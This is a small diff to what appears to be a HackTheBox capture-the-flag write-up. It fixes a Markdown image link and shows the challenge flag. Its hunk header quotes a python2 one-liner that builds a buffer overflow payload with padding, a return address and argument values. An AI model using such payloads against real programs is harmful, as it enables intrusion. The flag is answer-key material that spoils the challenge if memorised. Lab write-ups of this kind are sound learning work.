@@ -66,7 +66,7 @@ python2 -c "print('A'*188 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde
 
 Have a look:
 
-!(Stack structure)[./images/stack-frame-structure.png]
+![Stack structure](./images/stack-frame-structure.png)
 
 Flag: HTB{0ur_Buff3r_1s_not_healthy}
 
